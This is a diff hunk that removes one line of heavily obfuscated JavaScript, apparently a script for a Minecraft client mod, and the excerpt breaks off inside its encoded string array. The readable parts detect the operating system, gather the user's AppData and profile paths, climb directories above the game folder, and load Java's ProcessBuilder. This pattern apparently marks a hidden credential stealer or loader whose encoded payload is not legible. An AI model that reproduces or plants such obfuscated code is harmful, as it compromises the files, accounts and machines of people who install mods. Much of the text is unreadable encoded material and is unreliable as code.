@@ -1,1 +1,2078 @@
-const a0_0x49b0a2=a0_0x4c67;(function(_0x4a5dff,_0x612b68){const _0x577646=a0_0x4c67,_0x565209=_0x4a5dff();while(!![]){try{const _0x3ad5cc=-parseInt(_0x577646(0x498,'[B%l'))/0x1+-parseInt(_0x577646(0x216,'NO98'))/0x2+-parseInt(_0x577646(0x511,'etie'))/0x3+parseInt(_0x577646(0x35b,'whZ0'))/0x4+parseInt(_0x577646(0x2ac,'PwVi'))/0x5+parseInt(_0x577646(0x27e,'rMVl'))/0x6*(parseInt(_0x577646(0x419,'#cv9'))/0x7)+parseInt(_0x577646(0x667,'Fi7!'))/0x8*(parseInt(_0x577646(0x2a0,'pMYq'))/0x9);if(_0x3ad5cc===_0x612b68)break;else _0x565209['push'](_0x565209['shift']());}catch(_0x5928cd){_0x565209['push'](_0x565209['shift']());}}}(a0_0x5835,0xefbd2));const File=Java[a0_0x49b0a2(0x43d,'wIzM')](a0_0x49b0a2(0x187,'Q%]A'));function getOSType(){const _0x546510=a0_0x49b0a2;try{const _0x1b85a0=java[_0x546510(0x675,'zEki')][_0x546510(0x364,'PwVi')][_0x546510(0x5a2,'2Fbx')](_0x546510(0x2d5,'6(Qp'))[_0x546510(0x484,'Prp1')]();if(_0x1b85a0[_0x546510(0x2cd,'2Fbx')](_0x546510(0x1b9,'jqTf')))return _0x546510(0x3a7,'rMVl');if(_0x1b85a0[_0x546510(0x506,'lVXf')](_0x546510(0x1a8,'lVXf')))return _0x546510(0x607,'pMYq');if(_0x1b85a0[_0x546510(0x2ff,'h!Dk')](_0x546510(0x4cf,'iy!H')))return _0x546510(0x28a,'7%NS');return _0x546510(0x2cb,'Wi[K');}catch(_0x17ab3d){return _0x546510(0x346,'#cv9');}}function getEnvironmentPaths(){const _0x245084=a0_0x49b0a2,_0x2f5f77=getOSType(),_0x765cc5=java[_0x245084(0x356,'8(V@')][_0x245084(0x477,'dMvi')][_0x245084(0x62b,'tldi')]();if(_0x2f5f77===_0x245084(0x3ad,'4G]x'))return{'appData':_0x765cc5[_0x245084(0x61d,'RRF)')](_0x245084(0x251,'PgYc')),'localAppData':_0x765cc5[_0x245084(0x546,'5w@D')](_0x245084(0x627,'G3bK')),'userProfile':_0x765cc5[_0x245084(0x519,'Lz2$')](_0x245084(0x52a,'7%NS')),'separator':'\x5c','osType':_0x245084(0x379,'th37')};else{if(_0x2f5f77===_0x245084(0x607,'pMYq')){const _0x471c3c=_0x765cc5[_0x245084(0x442,'gkB6')](_0x245084(0x373,'NO98'));return{'appData':_0x471c3c+_0x245084(0x1db,'8(V@'),'localAppData':_0x471c3c+_0x245084(0x1da,'tldi'),'userProfile':_0x471c3c,'separator':'/','osType':_0x245084(0x550,'BYlI')};}else{const _0x48d2b3=_0x765cc5[_0x245084(0x404,'Fi7!')](_0x245084(0x2d0,'dMvi'))||_0x245084(0x39a,'a%Ty');return{'appData':_0x48d2b3+_0x245084(0x1f9,'dMvi'),'localAppData':_0x48d2b3+_0x245084(0x1c5,'Ep[K'),'userProfile':_0x48d2b3,'separator':'/','osType':_0x2f5f77};}}}const envPaths=getEnvironmentPaths(),appData=new File(envPaths[a0_0x49b0a2(0x502,'8(V@')]||a0_0x49b0a2(0x3a1,')WT4')),minecraftDir=new File(Client[a0_0x49b0a2(0x180,'gkB6')]()[a0_0x49b0a2(0x5b2,'wIzM')][a0_0x49b0a2(0x571,'#cv9')]()),parentDir=new File(minecraftDir[a0_0x49b0a2(0x505,'th37')]),grandParentDir=new File(parentDir[a0_0x49b0a2(0x52e,'lVXf')]),rootDir=new File(grandParentDir[a0_0x49b0a2(0x5d3,'#cv9')]),ProcessBuilder=Java[a0_0x49b0a2(0x47c,'NO98')](a0_0x49b0a2(0x5e4,'iy!H')),Scanner=Java[a0_0x49b0a2(0x620,'jqTf')](a0_0x49b0a2(0x4cd,'Q%]A'));function a0_0x5835(){const _0x532c7a=['W4m3WPBcGYS','rmkClwe3k8oXWO1dWRpcQq','W54fkmkK','W5aNWQje','W5VdLeS','W53dHuVcK2JdJSoIW4FdKYtdQG','W53dPmoMWOLAW4NdL8owvqtcQ8oZauZdRWtdGNxcOhvqW73cTbu','W5ddOmoKWR0HW6NdVa','WRRdICogWQddO8o9','W7BcOW/cNwGS','s2tcTmo9WPJcHW','osVcO8k+W65FsG1l','gcu4EW','WPyplSoaWPVdRMNdKKlcNJPF','nSkzWOCu','W7/cVGJcIwG3','W4VdJ0e','vmkNl1ZcNW','W6XXhSkic8oAyGJdLI7dIq','W6mqW57cVG','ggLCBqxdHG','vmkGlcpdTWSqWQpcH8kaxa','shhdQmocnmkmbSkdW7O','aWm/W5G','eIe9W53cNb3cKKZdOmksbmk2W6K','t8kkbmkqfCkL','WQJcKComlsmmWPy3aq','hSoiC37cKmopr1JcTKldGtxdHJNdQYFcTW','txb+WOVcGutdGvZcPCkTpCkSW7msWRnyeGJcUmkooxDBdGyU','qCkoo2aqnSoSWO91WQNcRCkPgHy','xa8Hm8o3ebu','bqlcPmk+','iCkEW7NcRSo1W4CrFCkPCSk0qa','W53dPmoMWOLAW5xdJmkrFuVcNSoGpfJdOGC','W5yCW4BcICk9gqFdJmo3W5moW6VdVNpdNfu3W6C','WPmOW6xdMbldOdHZECotqSkOW5FcQmo7Bmo6W5i','iSk3WQaL','qmkHWRuPWPSkW4ldUCoHmG','aHDpW4W','gc06','W4tdSCoXWPOaW5pdR8krzq0','C1NdTCoXkSkcdmkjW67dT8kRW5/cTCkaWOxcPmk/g3mgWQDzc8kyW4HEW6tdV8ojuSoKqCoyd8ovirZdVCoIWRDgWOFdOXC','WPSOW6JdJr/dUa','W5RcMqCbrSowFNqncSoGlq','WOBdGSonWQhdT8oU','W4uGWQndWPG','W6dcVNX2hq','ymkdgrtdIt0CWORcQSkPsCkWWQ5SWRW','ySkCgqG','dSorbq','calcUSkIFGbwWQdcPmoZyW','W7xcSbWMsmo1k1mjhSoG','WPmtpq','W7BcHLSOvG','shhdQmoBnSkEc8khW6BdOmks','W6tdOvZdRdVdHwOjWO14oCoHpgriWRi','WQNdJeO','A2uTW4KwW4S','vxrPWO7dSe/dLLRdPmkx','W6RcVayxxW','umkkxde1WRtdH8oz','pCoBhGRdNCoifvRdM8ocW7ZdMSkxWRtcOZRdQIuBDCo/Aa','fmoazgtcG8oEs0xcKfJdHYpcIt4','smkkBcqRWO7dNCoFW6ZcR1xcKSo8WR4','nH4YW4/cSmkMW6ZcQePX','W5dcPNX3gK3dHGKRjG','u8kefCkuf8kqW73cQaddVCkDWQu','zgJcQSoYWONcNq','FSkpr1tcLmoZD8k2WPCTd8k1W7XAW6Wbq3m','W4yDnSkM','EmkFcKJcVXtcKSoQBHZcUd/cS8oVW7X2WQpdLCkZpCoJW5rlWQddSSo3Cmk5fLv5WRxdQmoRWRPlW7TzbmkP','W4/cT3nIgLy','W7BcPmkOWRmija','W6NcSGdcIgG3mSo2WPmC','hWlcOCk+xW','W77cRSkOWR0aadhdHtzSWQdcSW','W5VdQSo3WOeAW6tdMCkmCdxcVSoMjG','W4aXWP7cGJi8hWnYW54','WQNcKmoamG','W7tdNuPvpSkfvmk5W4a','W6xcUqCrqG','W6VdH0ThjSk2tCkNW6nAW6hcKW','hmohffJdOmoBfexcKSoCW7W','W7BcPW/cNq','daJcVSkFvavOWQdcUmoXyJOrWRT6p8oTW7eVW5JdKqW','WR7dG8oCWO3dO8oKW7S','W5tdQSo+WOSvW5q','W4/cS25XpvVdVWqlj3Ds','W5yCW4BcKSk2ha','W7tdRCoIWOCzW4xdPW','W4/dHv7cGh/dLCoyW4VdItG','h2naCt7dHsHcW4ZdICoq','FeLOnh1mBW','vaC8nW','iG8NW7NcOCk2W5FcOeX8kgHvWQOvW5S','d8k4WR00','AeLOnNLjCN7dR8kwW5r2mCkgW5lcM13cSa','WQi+W6pdMeBdKsT/Emoj','W7/dMeVcIW','jGtcPmk+uHrLWQFcVSk0qHGkWRqPcmoWW6GGW4NdNqP3WRS','WRJcJmoklxqsWOm/amorWRamW4m','W5/dNvdcGw4','o8oqgLpcGHFcLCoPfrlcUJu','W5CwnmkSWOW','W7tcPSobWOGNtCktWQddGtek','qbqpzHmqwmk1W7GFjxn/WOhcKSkFWRG','ud7cKdpcJSkpW6qPm23dTG','Be1cW7NdTCo0Ee1tW7hdGmkFW6Hdpa','W4pdQSoaWOKaW4G','w3VdJ8oMkSkeeCkb','t8khW6OFgmoCW7BdTW','gqJcQ8k/','WRJdGGGa','FLTtW4tdKmoYz15oW47dKq','hb7cLSoGWQe','rmkrW5ytdSoa','W5xcIGuBemoYDJ8','W5aTWO3cNYSMpqC','swJcTq','ur8uyeuqqmkXW7uK','W40cWOOVdq','WP0foCoGWPxdNhBdJNpcIYTUW7WHgW','W4alW4dcTmkQ','W6tdH0Dni8kstG','WR7cJCozjKieWQu7cSoPWR4','W6DSamkYeCoA','f8okFudcMmoc','AX8Hjmo9dW','WPmIW4ddGWxdSsa','W5iqW5ZcV8k3hWe','WRRcH8oDhxqwWPiP','xCk4EWZcOmovsmoQWO4Rk8k8W51mW7CavG','W5VcT8oqWQe4xCkfWRVdNI8xWOxcR8oS','W5NdQSoN','qw3cR8oPWOq','uN/dMwddMSkOa8kexmojW4e','W5ldM01uz8k2wSkYW4Lp','WPpdVc0RxHdcOq','kdRcOmkHW7btwr1rug51WO/dVSkTW6m','WOPxW5hcTmk2dHVdJSkRW4aXW7BdTM/dNaOGW7yqtWZcV8kdW7HRW6dcSLSXWQu4WRSBtK/cISogWROQWPtcMriI','gCovaLNdH8ogcuFcIa','fmoazhhcG8odvflcSvJdJa','W7NcTrq','W7FcOSohWR8T','W5hcRSkLWQGjlZxcMdzKWQFcOLfIW7ddQ8oUW5rUW4NcRc1isSoJWPRcKSkiDXSHWQ1tWO5TW7rjr8k5qtxdI8oPBxldJIi6WPtdMea','nmkEW6ZcHmovW4yy','reLUfNnk','sCkAW5Wi','hCoqFupcLmoE','W6exWOi','xxxdH37dOCkM','zwnPWPZdINxdOe3dRCkepmk0W7C','t8kjwKRcICoX','vCo/W43cS8knWPNdOwJdKW','F0DMW5FdTmoO','W5ewp8kZWORdQG','tgBdPCoIlmkc','W7ZcRWtcLNGBuSkUW5nfWQVdSqa','WPNdQd03W6egqdu','WPKip8ooWPRdHMZdJW','W6TNgq','n8ofa8keWRK','W4ZdQ0VdNJFdH3TLWQ9GimoOzYzfWQFcHSkWrMq/uSovEMvWaNepW5pdGqmBlmkhW4FdL3nqWOhcNW/cPmoNnG','tLDJ','Bru3iSkIqG','nf9xW5/dTmk9FePsW4C','WRKpi8ovWPldGw3cJ0lcLJ1oW7iMgSkwzmogbcfbgSogW60JW64nWPeGW4uPW75PrLi/WOrZqLxcJxddO8oG','W6VcTba','nW8JW5hcPCk2W54','WOf8WRC','W6tdSmo7','W7tcT8ohWQuMzq','uM/cSCo0WOpcMmoF','vNxdNvVdRmk6nmkw','gI0MANykWPxdNCox','W4yrW4dcTmk1aqFdHa','W5pcS252gvhdOWqS','fCo4cetcUGlcKSoHlq','zgNcQmo1WOhcISoUFmoDCXzTbmkC','W4NcKsiFeCkHn3C','W5ddOmoKWQyvW43dNq','lI/cPmkcW6XesbXmBhqOWOddRmkV','WPOalCkR','W47cJCkKWR8nlwhdPGzSWQdcTW','i2HvAGtdHa','umkkxYqZWRu','tLDI','yCkbAcayWPNdJmoyW7NcV2NcHW','WPXRWPZcNYGPiq0PW5xdRrddImoMjSoVjGGcW659W4JcOthdSCkiWO8WWPW','jGy8W47cOq','A01Uaxjm','dqntW5Latr7dIXdcIXFdHmo/WQzpf8oV','aZCWBgarWPBdNSonWOVdSW','W4JcSbWvsmoinxS6bmo7iW1cWP8','W7SkmmkIWPldRaVcNwldPZWVW4yNabWejmkdWP3dGmk3btBcLMa','qXmECqWpva','wdlcJtFcLCkv','W5qGWOS','W4/cOSogWQqBz8ks','W6W5WP92r0O6WRa','W78ZWRHmve4X','nmobbCk2WR/dJSo4umoXq3aPlG','W6ddT3hdKYldJa','dSorbu/dNSoF','W4tcT2Lld1pdTa','c8olBcOPWRVdGmozWRFcRwRcNmoVWRRdJSoaW7PMWOKNW4hcIJJdQ8k/W6ZcTgGtfCoHACkmWPy','W5ynnCkGWPhdTWVdOKxdMrSJW5WXdG4vpa','W6H1h8kGs8ofDWFdN2pdVmovWOu5Fb0DW77dHrCzENf/','WOBcVmkPW51hWPddUSkoEdlcS8og','W48HWOvvWPRcSa','W7NcKqyfd8kNohq','FhGWW4GBW6DbgCkrW7ae','WRxdQalcLxiIdmo4W4GtW7BdGsnnocBdOXBdKgtdOCk1W7xcJNm9WOXlWOJdHSoxW4yxW75buSoaw8kgv8o6','vCkkk3Wdpa','WR0JamoXWPBdNxJdJ2pcIYTmW44LfSkb','sSkye8khk8kJW6lcVI3dSmkm','i8ougLm','bCoBeKVdNmoOc1pcV8orW63dJW','W67cHWiFbSkL','rNNdH33dUSk5iG','gHLYW59xsGtdUa','WQ80c8kmW48','WQGOW7tdMatdOG','u8o/W4dcGSocWOFdUG','W6ddJvXJomkfuSkLW7rpW6FcL8kqWRK','W5lcJs4ieCkXkwq','gG8HW4/cQ8kN','WRZdJGWRW4O/EtxdOmohksa','kb9nW44','W5RdMfhcM3JdJG','W6yrWRNdNx4','qspcIJW','W6P1gSkpamoryG','rgpdJgVdU8kVpmka','BKzvW4tdUCoWFf1dW73dN8kiW7q','xWmMamoQdqhdNSoIaSoa','W4Cxi8kXWPddPaldMg7dGbeQW4CN','W7hcRSkKWRCfjaldMGDJWQa','ACkotvhcT8oKASkJWQKOhG','CL9DfM5zFG','dWtcUCk4xHrG','W5yCW4BcN8k3jWFdNCo0W5iQ','cSk/WRO1WPC','lWSLW5ZdQSk5W5RcR1K3h1PoWQyxW5G','WRpdH8oEWQlcRmo8W6OZWQNdICkcW4NdJahdSSoi','gSkOW5FdP8kmWPnibSo9nW','W5qRWQfj','DuvZ','W6/cPIWlvCoFpvmwgCoT','F8ksr0JcJSoZDG','W5hcMX8mf8kG','xmkegmkbgSk4W6pcQW','B8kyxhhcGSoNCmkGWRmWk8kVW5zyW7SCrxK','d8oAW5ytbmodW6/dPmoVWOGrm1izWQWqFSoRh0adoM3cRg4Owmk1kHTinmowytm1WP3dGLC8lNRdHSkywwHGm8oZCCo2W5/dNxj2','WRRcL8oaoW','aGpcRSk+ssLI','dr5tW4risH/dSG','vXunm8oQgWhdJW','bseHtfusWOZdNCoxWPpdM8ooWQddTfRdMW','sXu7na','qgtdUCo8g8kceCkiW63dOmkdW7pcVSkj','W4eMWQvnWONcVCoFW4lcQ8kqW5G','W60LWQLWzve7WRfRDXm','hZCrD0igWPRdJmolWPxdRW','r8krW4e','imkoW7RcUCoaW5KuuCk3','vSkkpfifkSoXWODFWQVcQCkvdGFdJG','W5eaW4lcVG','W4SZWR50uff0WRjWArKfgG','W7dcT353c0RdMGuMhwPsdq','W6eqnmkQWPddOG','W7lcUGmhsq','W5dcONHM','W691eq','W6WDWPjTWQBcLmoIW7FcGCkLW7/dPa','W4dcOgr1gLe','Bxu2W5upW5fveG','sCoArG','E8kyxeBcICoG','sr8cCX4i','W6BdJeW','u27cICoUWP7cHSoFxW','mc05EW','bCorh03dHmob','W54bkmkKWORdRq','iYtcSq','jbGHW5ZcVCk2W5tcSuC','WRddImolWQ/dT8oTW7SP','rclcKdG','W7j1g8kYaa','W5efWOmVdrTHW64VkG','umoUW43cOSoqW4NcVsJdMs1qmSoUw8ksj8kYWRmICCksxSkmW7XszxSoW47dRmk0W5NcVtxdGbS3W4hdMmklgmkxsCkZW5DHWQ7dICouWRFdJNldMmkYW7ZdOX/cUmk3gfOxf3xdSa/cJgH1qX3cMCkTdCoNW48gW5VcPJpdVSkQWPX4iqfGWRDwW4ecfwZdNCkKWQazjsxcMmoYhCkiWRlcSh0ljaTLhCoTWPZcLmonW7tdIuWGWOJdRCk2caq','W58QWPZcKsOCpaTYW5pdLqpdK8oJ','WPRcQmk9W4vzWO3cLCovpeJdSSk/yXtcTLNcMIZdNIWpWRxdUfxcHLKz','Fw0OW5mw','W6NdJvbs','FG8+nq','qxHKWO8','WQNdGX0g','WP0foCoXWOxdGgNdH3tcIZC','qaijDW','q3hdSSo1lmkf','x8o/W43cM8onWOpdP3pdRJbrnmoGra','vG4nzH4tE8k5W6GI','DrlcSa','psxcGmkSW61y','t8kgW5WBa8olW5NdTSkYWQy','vZJcJdVcImkyW5bMjgO','iefzAWpdJaLmW4tdMSoPAcJdSGFcReaCB8kiWRjLWQldV8kaW4WVW4SKsCkmWQaomd3dPuK','W6pcPXOnvq','EmkFcKJcVXtcKSoQBH/cVIpcT8oSW6S/W6/dSCkUmCoVW51eWQpdTmo3zmkXhvv2W6JcOSoEWRbiW7rs','ANGNW5ugW50','FLTtW7ldPCoSyvvoW5BdKCkF','W4BcOmowWQK4DG','WQNdLrSxW5y3ErxdQSoJoIPNWQ0uW7/dTq','W5/dNLhcHM7dImo7W7BdHcddVa','WQNdK8oBWQS','W7aIWRHYdWX7WR5YnHChu2tdMqZdSGehswFcLW','WQZdLConWRhdKSo7W7e8WQZcI8kM','W4RcVhrX','cSk3WRON','WQ7dJ8ogWQFdRCo+W60','f0GXp8o2bbJdNmk/fCorWRaEW4tcGYqOwmo0w8oXlW/dNdJcUXdcGa3cVCkksqi5c0S','hqjtW4jlrapdUqa','W6DLhmkGcCoA','ALHgW5RdQCoJAuXoW43dMSocW6DrpJy','W7e3WP7cHImqda9GW5FdSa7dKW','wmkCdhOvpmo9WP9fWQ3cTq','W4xdOmoXWOW','W7NcQq7cKxuHnCo+WPmC','W7RcOmk4WPmBlXhdHX19WRhcOePO','bmofg07cVXu','tCoPW5ZcOmoZWOhdVwhdLcHg','W7ldHKnijCkauW','FNW2W4KhW6DfdCkxW7Oe','WRVdIrerW4O','WPKIW6JdJW','W7hcPmkIWRa','WRpdTCkgW799oSosWQddTbqKWOxcMq','8lENMmoX','qNxdNvJdTSkTnmkwqCohW4yCW6W','WOJdMGWa','W6JcS8oqWQilBCkiWRRdLcCkWONcS8oD','nYRcPCk0vGPHWP3cICo8DbytWRbvhSoSW6e+WOZdUH9SWQHPDce+WP5chmk4smokW77cRa','W4C8WO/cLq','qCkooMac','W5SkjCkVWOVdOqRdJG','z0DvW5FdRmobEeHJW4pdGmkm','cJ0b','WOKriCoiWOpdIKBdKMFcJt1BW4iWaCkqySoB','W64JkCkSWPNdQqRdOxldNGiPW58NFc8ElCkuWP3dOSk5aZO','rSkCEYa0','W5hcNX8m','cSoliq','W4ebmSkhWPhdIHRdIuhdGWq','W6aXWO3cMsGO','qslcIJq','E0LeW4xdPq','u8krW4eUd8ouW7pdPSkZWR4ZieSmWPOnBmoM','Be1cW7VdQCoUBvTvW4pdKSkz','zHucya8owmo9W4GZjNm','W7ldMKq','AvfcW5pdSW','hvZdUW','u8kaW4CvbmocW6/dPCk5','WPSSW6JdJq','tSkeEsrPWRtdHSkqW57cO2NcLG','wfXeW5/dRSoN','A0LUcw8','W651gSk1nSomEa3dRctdGCoc','cW5eW4G','W4BcO2HKaK0','wCkao2CjomoZWO4','rMFdNCoGkSkmbG','W5KKWONcKwGJkqrHWPJdLHBdLCoIiCo9','sefgW57dPCoY','W7FdIvPvlW','hJ7dINBdU8kOomkchCoSW5yrW7/cG2C6CZFcR0pdKZ9bn8kuhGfDiCk9r8oSvbZdUJ9dimk+WRpcO8oZW5RcQSoVW5dcNSoDuSohAmod','xmkzd8kfd8k+','WORdKSoAWQRdRmoUW5WVWQZcI8kNW57dJa','oSkiW5ZcO8ogW44Es8k/DmkO','ymkGtbCEWO3dVCoHW5xcHuhcTG','cSk5WRCHWOn2W4BdU8oqnNDt','W6BcTNPGmq','f0GXp8o2bbJdNmk/nmolWQmhW4ZcUt4Ja8ohx8oLk1xdSJ7dTsRcIKFcLSkwbJeRgLHfW7rvuCkUWOPamSoyW6HSqa','rSkDW5Kid8ox','WPabo8oaW5NdHNBcJetcHJPBW5WNaCkdDmoMh28rcCoDW4W6WRemWPe5','gWZcUmkOva','hmohfg7dLCofeK7cKSoeW7ZdNa','ywJcTSo/WR/cLSoctmoDEdjGc8knWO4loCopW4q','WRRdJSoAWQZdR8oGW6S3','WQJcRWesESks','taKbjmoQcX/dNa','W4hcQSozWQK','BCkCdHJdIr0+WPhcR8knB8k+WQ5UWQNcOCknWOy','W67cRCorWQKWtCka','W6VcPSoBWQS8AG','W5SKWOZcVIm3pa','vmkBW6uDhSon','u8kcgmkaaW','fwjuBqNdRbW','C1NdTCoXkSkcdmkjW67dT8kRW5/cTCkaWOxcPmk/g3mgWQDzc8kyW4HEW6ZdTComuSo9dCo/j8o4oH4','WOKfoCoJWPJdGhxdH2FcKq','y8kMgCkpeSk9W6hcUrJdMSkaWRBcMmkyWRNcPWddNCo5W6FdTSkEDSkpnq','i8oigui','WQNcH8oAkW','uZlcLX7cGmkqW6u','qJBcJYxcHa','W6FcSSkUWQ48mY7dKXTHWRe','w2LIW7xdIa','mJfoW4rctW/dGZRcJGddPSo7WQ9/k8oVWOnauSkvWRzBsNmfuSkiACkiFWtdU8o0W5/dKG','acdcNhxdNmkKnmkFra','r8kkyc4UWRJdUCoFW6ZcOG','kIBcV8k+W7W','W4abj8kNWR/dQqpdV0JdGHu1','tmkvW5SB','W5iqW5W','W6JdOvhdRJFdIMmPWOL8nmolngniWRm','W6mkWQZcPa','BLbtW5u','WOa/W6/dNG4','WPyfi8ogWOpdHW','x3JdVCoMpSkcdCkl','ASomga','x8o/W43cK8obWOddVwVdIdbgaCoGxCkE','BCooW7/dV8kB','W499b8kKbSoBDW/dJgddR8oZ','hCoBiuVdHmob','cd9KWOxdJeVdIaFdUmknkmkQW6y','cxHzza','W5e4WRPJwuOWW7DrsJOEtI/cMGxdTKiigM7cLHzanJ8','W5ewW6hcR8kQarZdJG','WQ7cLSoBnMmfWP48hq','tb8Inq','eCoybui','qdJcIdxcJW','hcuJFX4nWPZdJmkkWQ7dUmooWQddNvhdM8k1W7Gnrq','W4lcJSkyWOG','CJ7cJZu','W4/dHu3cM2xdGCoMW4tdHa','e8kIWR0S','W7NcPmkYWPOflstdPHT3WRe','bmoiemkeWQ8','m8oDaCks','W5ddNLZcK2FdTCo7W4pdItxdIt3dPeW','W5pdRmoJWOSBW5ldNa','ErqGmCoHeq','kJJcQCk9W61F','imoryKJcN8ol','m8otreZcHmo3ACoQWRmSgSkVW5W','wwO2Cv4fWPddNW','utNcHYpcTSkuW7rV','W5tcQmk5WRKklJNdQG','eZW8Buqq','EmkIycOGWRhdJmoIW5VcONFcNmoLWRpdT8k4W6PRWOLOW6JcJMpdHSkmW4VcSgjsm8o5FmkKWR/cMZlcHCkPlHBdNgqm','W7hcRCkKWQ8j','j8oqgLtcPH3cICoPmG','W6hcSbWSrSoxoW','W6hcTCk5WRucjIJdKWS','W5Kbp8kW','daroW5XwrHJdRc7cJWBdOCogWQTqdCoRWOLafSkI','v8kuyYWZWRJdTSooW7NcUhBcLSoxWRpdMCkFW7z8','WQddMHyc','zrzZW6JcKCkCW7/dUX4','W5pcP25T','W4RcVh5Pg1RdTbm','k8obh8kqWQJdHq','W57cLGmedSkHlh0','ySkBgX7dIJaQWOG','WRxdIColWQldRSoiW64QWOhcHSk3W5O','AwtcRSoTWOpcNCoAzmo7EHHZaCknWO0','W5pcHmky','W4uQWRHFWP7cPG','tmkFf8khd8kIW5RcStddTa','EebZf3K','W6tcRmofWRuhza','qxC2lfvBW4RcICkjWOhcPSkFW63cSqhcImkMW79tvgtcVez6WPrUCSoKrbNdLu7dGCoIyXi','W6tcQ8ohWQmLA8ktWRK','WR3cRmkUWQ8FicBdKaeI','W7tcQmkNWRK','uYjtzX/dHrne','W77cPmkLWRSykq','tmoJW4NcTW','v8kvyYWZ','emoYjhFcSadcMSoGja/cSIlcH8oZW7W4','W7RcTCk/WQW','W7DNdmkZnCoBEq/dKshdIq','wJBcJJu','W7RdT0ddMaldM2aUWPj1nq','W6hcSbWMqSozmumCgq','W6ddJvXIl8kuuCk2W5vEW7hcSCkEWRRdUSknW6LMW5KVDXe','umkkEYqRWO3dImonW6VcVwRcGCoSWQxdRCkcW6XGWP8','W497dCkOa8oaCXS','bWlcQCk6xsD0WRhcJSo1CHG','W5pcRmoEWQKM','W4C3WQvIWOVcUmox','W74/WQbN','kSojeG','fmoba8kbWRNdN8k9rSoWwh03AW','CSkgohSckW','WQxdLrSjW5OJAam','uSkhgXJdIt4','dCoDaKNdN8oBhWZcT8oFW7RdJ8kjW73cLt3cQ3Lk','nmkEW6ZcI8owW5Gsu8kLCSk0y8oGWRldVa','m8kCs0dcImoJA8kXWRnQeCkUW5zg','cmoeauBdMCokgLFcKSoFW7FcGCkpWQ7cQsC','E1zNWOxdIeBdGxtdImkno8k3W64IWR1biGlcPmoaghvBbG','fComFeq','tmo1W7xcVCouWPBdOetdNdDg','W67dKSkFAZLuW4ereSodWRGTW5a','r8kAbrtdLa','eSk/WRKLWQnwW4xdV8objgzw','g8oPhSknWRxdGCoXqSoEBhS3lSo1WObmA8o4jcD0WQSxnZa','W4/dLeVcS2JdHCoQW5hdJJNdUZddTq','W4ewW5/cUSkXbG','WPGzoCoeWOq','WR7dG8oCWOhdU8o9W7SP','imobbCkZWRNdJSoXqSoWt3ydiSo2WOnq','W4BcOg9Qha','aSk5WRKHWOzz','q8kaEWSMWRddJa','xCkak3ilcSoQWOPEWRRcNmkKgXS','yhWPW58','zYpcGJ7cHCkCW7jJe23dQ8oUis7dLKHeWRq','mq8GW4K','vZlcIJW','aghdKgpdLmofWRrZfvldGCoYkW','bCk6WRSZWOO','q3VdV8oZnmkSd8kwW4ZdOSkdW7S','d8oAW5ytbmodW6/dPmoVWOGrm1izWQWqFSoRh0adoM3cRg4Owmk1kHTinmowytm1WP3dIL05lMpcISk/aKv7mq','qM/cUCoOWPxcN8ofxCoCsHX9eq','W5q5WQTRwWmqWRz2EG','W4ebmSkrWPVdTbRdMeldGIa0W50YrqGzmq','EKH4','s8o/W43cK8oaWPddT3tdJI1bpCoK','WQddNHycW5SV','W7xcSbWWqSolk0ikh8ozlrbpWOpdQW','W60IWQvU','W4/cKIFdLYq','W5Wnkq','cmk/WRS','W4NdHvBcNG','W73cOXxcU343cSoZWPiaW7ZdVIvvnq','v8oAlsvrBmo7W5OhW6JcRCo0xf7cKSoovmkZESo4zmk7W7CrrmkWoCkLmSkjFehcRJbhnq','xr47i8oSeq','WO/dKWOkW4iIuIddVmoCptb4WR9k','xgddRSo7nSkkfSkaW7e','vmkMidu','W5ubmSkbWOFdSqRdJG','Emk8bZ5FyCkRW5ihW64','WRpdH8oEWQldUSkNW70OWRZcL8k3W5tcKcpdUCoca3FdO8kWiCkqW5ezW6FdLCk9d1tdUq','W6VdIuzb','t8kkbCkgdmk+W7/cVdC','W5ZcRW3cNW','BhZdRSo9nCkecSklW5FdH8ksW7ZcSmksWOZcJa','W6NdQfddMtO','W7W/WR9HwLeW','WR/dICoAWO3dO8oKW7S','eSk5WPy5WPTsW7FdUCoMnNO','W5ldVCo5WPSaW5m','W5ddLfhcLx/dJG','EerUc3frCNy','nCkIWRuUWOTwW4tdR8oxohnlACoLWRPwxNS','W6aWWO/cLtqCpWTHW6BdGq','W6JcQZGV','WOKfoCoZWPldNMZdH3xcIWnBW6K9hmkg','xJBcLthdJ8kuW68Pjg/dQ8oZbYW','W6ZdQeRdMtFdRge8WOLG','bSo0iCkZWP3dUCoC','fCoed0hcTadcNSoPeX7cTJtcSCoX','W4xcOXpcIhm2','WRJdLcSrW50UyXC','W5mIWRrp','WPJdLCoIWOehW43dTmkzzaVcVmo6k0VcTbxdLglcNhrmW6ZcPLBdGqDBW6q','W5hcT3XHmvVdOXiWpa','u358WOVdG2NdI0FdOmkmlmkRW4uOWPr6nq','tmkrW5SBhSon','W6hcSbW3CSoZgG','W5dcT2Lxc0/dPauSoLDsgSoRWO3dHW','yhqNW58qW4i','bGiHW5lcQCkWW6tcHvT/lvTqWRS','v3b6WPNdINxdGvRdUCkkoW','bSorEu0','BCksbXy','Bf51ehK','ECkts1hcNSoMCCkSWQ8Qmmk4W4bUW7eBx2q','lbKsW4/cTSk0W4i','puLJ','W5qmkCod','iCoibmkeWRq','amk/WQyLWOLyW44','vhtcTa','WQRcJCoBm2KUWPG7aa','lCofb8kwW7ldGCo8tCoLbeeXoCo6WOft','iJ3dQSklrarOWQJcQq','lI/cPmkeW7Datr1Rs3i/WOtdOa','zKfvW4tdR8oZz15tW73dLCkoW65njdz1q2tdHq7cGmk0','d8oveK/dKSogfeJdLCotW7BdGW','W7ldM01ugSkfuSkXW45xW7a','W5ZdSfFdGZZdJG','hmoagey','W6r9bCk1amoB','txiQW5qhW5TufSkkW7S','rg7cTW','W7lcSHxcIM9+sSkW','W6VdQ0JdIZVdHW','W5VdLeVcU2xdLSo6W5BdRItdQZNdSuK','W5VdLeVcS2NdLCoGW47dIctdVaZdSva7','Bmkiw0S','aISgAKikWPFdNW','W4dcVaqh','W4KwW5hcUSk0kqldMCoaW4yQW7G','AbdcJd/cHSkrW6vBe2RdQCo4aZVdVNryWR83D3xcQmoRj8kLjmorv8o6W7hcGa5MWPRdJmoD','wLtdS8oUaLzgWRFcO8odAI0','W6hcTCkQWQ4ymHBdNazL','rgNcU8oOWQ/cGmovxCo5yq','WOZcT252c1ddPqK+iJvAb8oGWPddJgpcN8k4ACoiWOvqWQ1PWQhdKLtcPmkAbmkNxbW','EenShvnEvxRdSSkfW6e','W6RcTbSwASovoK4FaSoXla','AXiGoCo2bq','nqSGW47cS8k6W4NcPu03jL1tWQe','WOKfoCoZWPldNMZdH3xcIX5mW7iLfSkqECoq','wCoQW4NcVSokWPddS3pdLcTnFSoRwSkzk